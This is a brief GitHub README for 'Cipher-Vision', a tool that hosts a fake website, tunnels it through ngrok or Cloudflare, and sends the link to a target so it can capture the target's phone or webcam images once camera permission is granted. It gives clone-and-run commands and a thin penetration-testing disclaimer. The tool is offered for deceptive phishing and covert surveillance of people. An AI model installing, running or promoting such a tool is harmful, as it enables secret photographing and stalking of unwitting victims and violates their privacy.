...
![Cipher_Vision](https://github.com/SmartGeniusHacker/CipherVision/blob/main/cipher-vision-banner.png)

# What is Cipher-Vision?
<p>Cipher-Vision is techniques to take cam shots of target's phone front camera or PC webcam. Cipher-Vision Hosts a fake website on in built PHP server and uses ngrok & CloudFlare Tunnel to generate a link which we will forward to the target, which can be used on over internet. website asks for camera permission and if the target allows it, this tool grab camshots of target's device
...
```
git clone https://github.com/SmartGeniusHacker/CipherVision.git
cd CipherVision
bash cipher-vision.sh
```
...
<p>Cipher-Vision is created to help in penetration testing and it's not responsible for any misuse or illegal purposes.</p>
<p>Cipher-Vision is inspired by https://github.com/thelinuxchoice/ Big thanks to @thelinuxchoice</p>
